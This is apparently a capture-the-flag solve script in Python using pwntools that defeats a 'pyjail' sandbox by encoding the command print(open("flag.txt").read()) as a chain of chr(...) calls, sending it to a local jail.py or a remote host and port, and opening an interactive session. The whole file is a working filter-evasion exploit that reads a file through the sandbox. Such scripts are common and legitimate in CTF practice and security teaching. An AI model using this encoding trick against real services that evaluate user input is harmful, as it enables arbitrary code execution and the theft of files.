from pwn import *


def toChr_payload(s: str) -> str:
    """
    Converts a normal string into a series of chr(...) calls joined by '+'.
    For example: 'abc' -> 'chr(97)+chr(98)+chr(99)'
    """
    return '+'.join(f'chr({ord(c)})' for c in s)




def main():
    if args.HOST and args.PORT:
        p = remote(args.HOST, args.PORT)
    else:
        p = process('../build/jail.py')
    payload = toChr_payload('print(open("flag.txt").read())')
    p.sendlineafter(b'<<[cmd]>> ', payload.encode())
    p.interactive()

if __name__ == "__main__":
    main()
    print(toChr_payload('print(open("flag.txt").read())'))

